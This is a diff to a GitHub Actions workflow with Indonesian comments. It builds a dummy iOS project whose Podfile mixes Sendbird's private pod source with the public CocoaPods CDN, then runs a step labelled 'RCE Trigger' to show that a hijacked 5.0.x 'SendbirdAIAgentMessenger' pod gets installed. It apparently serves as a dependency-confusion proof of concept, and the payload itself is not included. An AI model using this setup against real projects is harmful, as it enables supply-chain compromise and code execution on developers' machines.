@@ -8,8 +8,31 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Pod Install
+      - name: Setup Simulation Environment
         run: |
-          pod install --repo-update
-          echo "CEK VERSI YANG TERINSTALL:"
+          # 1. Bikin dummy project iOS secara otomatis
+          pod lib create DummyApp --template=https://github.com/CocoaPods/pod-template.git --allow-root --non-interactive
+          
+          # 2. Masuk ke folder Example project-nya
+          cd DummyApp/Example
+          
+          # 3. Tulis ulang Podfile dengan skenario serangan lu
+          cat <<EOF > Podfile
+          source 'https://github.com/sendbird/sendbird-ios-distribution.git'
+          source 'https://cdn.cocoapods.org/'
+          platform :ios, '15.0'
+          target 'DummyApp_Example' do
+            use_frameworks!
+            pod 'SendbirdAIAgentMessenger', '>= 1.13.0'
+          end
+          EOF
+
+      - name: Pod Install & RCE Trigger
+        run: |
+          cd DummyApp/Example
+          # 4. Eksekusi install. Ini bakal maksa CocoaPods milih versi 5.0.x lu
+          pod install --repo-update --verbose
+          
+          echo "--- HASIL VERIFIKASI ---"
+          # 5. Buktiin kalau yang kepasang adalah versi bajakan lu
           cat Podfile.lock | grep SendbirdAIAgentMessenger
